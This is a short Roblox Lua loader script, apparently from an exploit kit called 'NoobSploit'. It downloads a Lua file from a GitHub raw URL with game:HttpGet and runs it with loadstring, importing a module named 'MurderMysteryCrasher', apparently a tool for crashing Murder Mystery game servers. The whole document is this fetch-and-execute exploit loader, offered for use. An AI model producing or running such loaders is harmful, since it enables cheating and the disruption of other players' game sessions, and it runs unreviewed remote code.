local owner = '78n'
local branch = 'NoobSploit'
 
local function import(file)
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/%s/%s/main/%s'):format(owner,branch,file..'.lua')))()
end
 
import('MurderMysteryCrasher')